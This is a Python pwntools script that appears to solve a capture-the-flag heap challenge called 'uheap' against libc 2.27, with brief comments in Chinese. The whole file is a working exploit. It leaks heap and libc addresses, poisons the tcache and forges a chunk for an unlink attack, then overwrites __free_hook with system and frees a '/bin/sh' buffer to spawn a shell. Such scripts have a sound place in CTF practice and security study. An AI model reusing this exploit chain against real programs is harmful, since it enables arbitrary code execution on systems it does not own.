#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./uheap')
libc = ELF('./libc-2.27.so')
elf = ELF('./uheap')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(idx,length):
	p.sendlineafter(':','1')
	p.sendlineafter('Index:',str(idx))
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('Index:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('Index:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('Index:',str(idx))

p.sendafter('Input your favorite sentence:\n','1234')
p.sendlineafter('Input your cookie:\n','365303148')
p.recvuntil('Your first gift: ')
MysteriousXOR = int(p.recvline('\n'),16)
p.recvuntil('Your second gift: ')
MysteriousXOR2 = int(p.recvline('\n'),16)

heapbase = (MysteriousXOR ^ 365303148) - 0x250
point_sentence_chunk = MysteriousXOR ^ MysteriousXOR2
node = point_sentence_chunk - 0x30

pr('heapbase',heapbase)
pr('point_sentence_chunk',point_sentence_chunk)
pr('node',node)

add(0,0x80) #0 0x290
add(1,0x80) #1 0x320
add(2,0x30) #2 0x3b0
add(3,0x48) #3 0x3f0 unlink目标
add(4,0x88) #4 0x440
add(5,0x30) #5 0x4d0

#填满tcachebin
for i in [1,0,1,0,1,0,1]:
	delete(i)
	edit(i, p64(0))
delete(0) #放入unsortedbin

show(0)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x3ebca0
free_hook = libcbase + libc.sym['__free_hook']
system = libcbase + libc.sym['system']
pr('libcbase',libcbase)
pr('system',system)
pr('free_hook',free_hook)
free_hook_1 = free_hook  &~ 0xfff 

edit(1, p64(heapbase+0x440))
add(1,0x80) #chunk0
edit(1, p64(heapbase+0x440))
add(0,0x80) #分配去 chunk4 地址处

#unlink
point_chunk3 = node + 0x18
target = point_chunk3
fd = target - 0x18
bk = target - 0x10
fake_chunk = p64(0) + p64(0x40)
fake_chunk += p64(fd) + p64(bk)
edit(3, fake_chunk)

edit(0, p64(0x40)+p64(0x90)) #修改chunk4 pre,inuse
#填满tcachebin
for i in [4,1]:
	delete(i)
	edit(i, p64(0))

#fake_chunk 与 chunk4 合并, 发生unlink:所以 chunk3 指针修改为 point_chunk3 - 0x18 即为 node
delete(4)

#chunk2 5 放入 tcachebin
delete(2)
delete(5)

edit(5, p64(free_hook))
add(5,0x30) #chunk5
edit(5, p64(free_hook))

#用指针 chunk3 修改 point_sentence_chunk 的值,绕过检查
payload = p64(heapbase+0x2a0) + p64(heapbase+0x440)
payload += p64(heapbase+0x3c0) + p64(node)
payload += p64(heapbase+0x450) + p64(heapbase+0x4e0)
payload += p64(free_hook_1+0x250)
edit(3, payload)

#分配去 free_hook 写入 system
add(2,0x30)
edit(2, p64(system))

edit(1, '/bin/sh')

delete(1)
p.interactive()
